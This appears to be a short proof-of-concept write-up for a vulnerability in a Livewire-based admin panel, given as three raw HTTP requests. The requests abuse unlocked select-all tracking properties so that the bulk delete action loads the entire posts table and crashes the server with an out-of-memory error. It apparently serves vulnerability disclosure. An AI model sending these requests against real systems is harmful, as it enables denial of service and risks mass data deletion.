### VULN-007 — decisive requests. Full capture in response.txt / run.log.
### "Select all" is deselection-tracking: 3 public (non-#[Locked]) Livewire props.
### Empty deselect list ⇒ whereKeyNot([]) ⇒ the whole table; default null chunk ⇒ ->get().

### 1) Snapshot (authenticated panel user)
GET /admin/posts HTTP/1.1
Host: localhost:21890

### 2) Mount the delete bulk action with select-all tracking (opens confirm modal)
POST /livewire/update HTTP/1.1
Host: localhost:21890
Content-Type: application/json
X-Livewire: true

{"_token":"<csrf>","components":[{"snapshot":"<list-posts snapshot>",
  "updates":{"isTrackingDeselectedTableRecords":true,"deselectedTableRecords":[],"selectedTableRecords":[]},
  "calls":[{"path":"","method":"mountAction","params":["delete",[],{"table":true,"bulk":true}]}]}]}

### 3) Execute → framework hydrates the ENTIRE table to pass $records → HTTP 500 (OOM)
POST /livewire/update HTTP/1.1
Host: localhost:21890
Content-Type: application/json
X-Livewire: true

{"_token":"<csrf>","components":[{"snapshot":"<snapshot from step 2>",
  "updates":{},"calls":[{"path":"","method":"callMountedAction","params":[]}]}]}

### Response to (3): HTTP 500; app log: "Allowed memory size of 536870912 bytes exhausted".
### Row count is unchanged afterwards → the OOM preceded any delete.
